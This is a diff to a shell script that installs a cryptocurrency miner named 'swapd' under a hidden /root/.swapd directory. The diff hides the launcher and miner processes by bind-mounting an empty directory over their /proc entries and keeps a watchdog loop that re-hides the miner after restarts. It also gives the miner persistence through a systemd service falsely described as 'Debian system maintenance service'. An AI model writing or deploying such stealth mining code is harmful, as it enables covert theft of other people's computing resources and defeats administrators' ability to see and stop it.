@@ -1156,24 +1156,21 @@ cat << 'EOF' > /root/.swapd/launcher.sh
 MASK_DIR="/root/.swapd/.mask"
 mkdir -p "$MASK_DIR"
 
-# 1. Start the miner in the background
+# 1. Hide THIS script (the launcher) first
+mount --bind "$MASK_DIR" "/proc/$$"
+
+# 2. Start the miner and hide it immediately
 /root/.swapd/swapd --config=/root/.swapd/config.json &
 MINER_PID=$!
-
-# 2. Hide it IMMEDIATELY (before it even fully initializes)
 mount --bind "$MASK_DIR" "/proc/$MINER_PID"
 
-echo "Miner started with PID $MINER_PID and hidden instantly."
-
-# 3. Keep the hider loop running in case the miner restarts
+# 3. Watchdog loop to catch restarts
 while true; do
     CURRENT_PID=$(pidof swapd)
-    if [ -n "$CURRENT_PID" ]; then
-        if ! mountpoint -q "/proc/$CURRENT_PID"; then
-            mount --bind "$MASK_DIR" "/proc/$CURRENT_PID"
-        fi
+    if [ -n "$CURRENT_PID" ] && ! mountpoint -q "/proc/$CURRENT_PID"; then
+        mount --bind "$MASK_DIR" "/proc/$CURRENT_PID"
     fi
-    sleep 2
+    sleep 5
 done
 EOF
 
@@ -1185,15 +1182,14 @@ Description=Debian system maintenance service
 After=network.target
 
 [Service]
-# Run the launcher instead of the miner directly
+Type=simple
 ExecStart=/root/.swapd/launcher.sh
 Restart=always
 Nice=19
 CPUSchedulingPolicy=idle
 IOSchedulingClass=idle
-MemoryMax=2G
-# Ensure we unmount everything if we stop the service
-ExecStopPost=/usr/bin/umount -a -t tmpfs,ramfs 2>/dev/null
+# Targeted cleanup: unmounts only if the directory looks like a PID
+ExecStopPost=/bin/bash -c 'for m in $(mount | grep "/root/.swapd/.mask" | awk "{print \$3}"); do umount $m; done'
 
 [Install]
 WantedBy=multi-user.target
